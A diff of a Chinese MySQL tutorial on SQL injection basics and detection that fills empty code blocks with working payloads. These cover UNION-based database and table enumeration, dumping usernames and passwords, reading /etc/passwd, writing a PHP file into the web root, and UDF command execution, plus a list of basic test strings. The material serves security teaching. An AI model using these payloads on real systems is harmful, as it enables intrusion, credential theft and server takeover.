@@ -1,25 +1,21 @@
 ---
-order: 150
-tags:
-  - mysql
-  - security
-  - performance
-  - database
+order: 730
+title: SQL 注入基础与检测
+module: 'mysql'
+category: 数据库
 difficulty: intermediate
-title: 'SQL 注入基础与检测'
-module: mysql
-category: 'MySQL Advanced'
 description: 注入原理、检测方法与防御策略入门。
 author: Anonymous
+updated: '2026-08-02'
 related:
-  - mysql/快速查阅
-  - mysql/控制器与应用
-  - mysql/SQL注入攻击类型与实战
-  - mysql/SQL注入防御策略
+  - 'mysql/071-MySQLQuickLookup'
+  - 'mysql/072-MySQLControlApplication'
+  - 'mysql/074-SQLInjectionAttackTypePractice'
+  - 'mysql/075-SQLInjectionDefenseStrategy'
 prerequisites:
-  - mysql/语法速查
-updated: '2026-08-01'
+  - 'mysql/071-MySQLQuickLookup'
 ---
+
 ## 1. SQL 注入概述 (Overview)
 
 ### 1.1 什么是 SQL 注入
@@ -149,43 +145,49 @@ SQL 注入成功的关键要素：
 攻击者首先需要收集目标系统的信息：
 
 ```sql
- -
- ?
- ?
- ?
- ?
- -
- ?
- -
- ?
- -
- ?
+-- 1. 探测注入点是否存在：两次响应不同说明可能存在注入
+1 AND 1=1
+1 AND 1=2
+
+-- 2. 探测数据库类型与版本
+1' UNION SELECT VERSION(),2,3 -- 
+1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1) -- 
+
+-- 3. 获取当前数据库名与用户
+1' UNION SELECT DATABASE(),USER(),3 -- 
+1' UNION SELECT 1,CURRENT_USER(),DATABASE() -- 
 ```
 
 #### 2.3.2 数据库枚举阶段
 
 ```sql
- -
- ?
- -
- ?
- -
- ?
- -
- ?
+-- 1. 枚举所有数据库
+1' UNION SELECT 1,2,GROUP_CONCAT(schema_name) FROM information_schema.schemata -- 
+
+-- 2. 枚举当前库的所有表
+1' UNION SELECT 1,2,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE() -- 
+
+-- 3. 枚举目标表的列
+1' UNION SELECT 1,2,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users' -- 
+
+-- 4. 读取敏感数据
+1' UNION SELECT 1,username,password FROM users -- 
 ```
 
 #### 2.3.3 权限提升阶段
 
 ```sql
- -
- ?
- -
- ?
- -
- ?
- -
- ?
+-- 1. 查看当前用户权限
+1' UNION SELECT 1,2,GROUP_CONCAT(privilege_type) FROM information_schema.user_privileges WHERE GRANTEE=CONCAT("'",USER(),"'") -- 
+
+-- 2. 尝试读取文件（需要 FILE 权限）
+1' UNION SELECT 1,2,LOAD_FILE('/etc/passwd') -- 
+
+-- 3. 尝试写入 WebShell（需要 FILE 权限且 secure_file_priv 允许）
+1' UNION SELECT 1,0x3C3F70687020706870696E666F28293B3F3E,3 INTO OUTFILE '/var/www/html/info.php' -- 
+
+-- 4. 具备条件时可尝试通过 UDF 插件执行系统命令
+SELECT sys_eval('whoami'); -- 需要已安装的 UDF 扩展
 ```
 
 ## 3. SQL 注入检测方法 (Detection Methods)
@@ -195,42 +197,34 @@ SQL 注入成功的关键要素：
 #### 3.1.1 基础测试 Payload
 
 ```sql
- -
- '
- "
- ' OR '1'='1
- " OR "1"="1
- ' OR 1=1 --
- " OR 1=1 --
- ' OR 'a'='a
- " OR "a"="a
- -
- ' --
- " --
- ' #
- " #
- /* */
- -
- ' OR 1=1 --
- ' OR '1'='1
- 1' OR '1'='1
- -
- ' AND 1=1 --
- ' AND 1=2 --
- 1' AND 1=1 --
- 1' AND 1=2 --
- -
- 1 AND 1=1
- 1 AND 1=2
- -
- ' LIKE '%
- %
- -
- ' IN ('a', 'b') --
- -
- ' UNION SELECT NULL --
- ' UNION SELECT 1,2 --
- ' UNION SELECT NULL, NULL --
+'
+"
+' OR '1'='1
+" OR "1"="1
+' OR 1=1 --
+" OR 1=1 --
+' OR 'a'='a
+" OR "a"="a
+' --
+" --
+' #
+" #
+/* */
+' OR 1=1 --
+' OR '1'='1
+1' OR '1'='1
+' AND 1=1 --
+' AND 1=2 --
+1' AND 1=1 --
+1' AND 1=2 --
+1 AND 1=1
+1 AND 1=2
+' LIKE '%
+%
+' IN ('a', 'b') --
+' UNION SELECT NULL --
+' UNION SELECT 1,2 --
+' UNION SELECT NULL, NULL --
 ```
 
 #### 3.1.2 检测步骤
@@ -361,20 +355,3 @@ SQLMap 是最流行的自动化 SQL 注入工具。
 MySQL 索引与优化，见 020-mysql 模块文档。
 MySQL 日志体系，见 020-mysql 模块 redo/binlog 文档。
 Redis 缓存与 MySQL 组合，见 022-redis 模块。
-## 深度专题扩展
-
-以下专题从不同角度深入本文主题，供有进阶需求的读者研读。每个专题独立成节，内容相互补充。
-
-### 13.1 InnoDB 日志与崩溃恢复
-
-redo log 记录物理页修改（WAL：先写日志再写数据页），崩溃后重放恢复；环形文件组 + checkpoint 推进。
-undo log 记录事务前镜像，支持回滚与 MVCC 版本链；purge 线程清理。
-两阶段提交：redo prepare -> binlog -> redo commit，保证两份日志一致，主从不丢数据。
-刷盘策略：innodb_flush_log_at_trx_commit=1 最安全（每次提交 fsync），2 每秒刷。
-
-### 13.2 执行计划与优化器
-
-EXPLAIN 关键列：type（const/ref/range/index/ALL）、key、rows、Extra（Using index/Using filesort）。
-优化器基于统计信息选计划；analyze table 更新统计；hint（FORCE INDEX）谨慎使用。
-排序与分组：filesort 优化为索引序；避免临时表。
-慢查询治理流程：慢日志 -> 计划分析 -> 索引/改写 -> 验证。
